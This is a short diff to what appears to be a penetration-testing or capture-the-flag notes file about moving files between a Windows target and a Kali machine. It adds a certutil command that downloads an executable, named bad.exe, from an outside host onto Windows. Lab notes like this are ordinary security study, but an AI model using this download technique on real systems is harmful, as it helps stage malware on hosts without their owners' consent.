@@ -18,3 +18,6 @@ To transfer files from windows to kali.
 
 `cp groups-result.txt \\10.10.14.69\purple`  
 
+## certutil  
+
+`certutil.exe -urlcache -f http://10.0.0.5/40564.exe bad.exe`
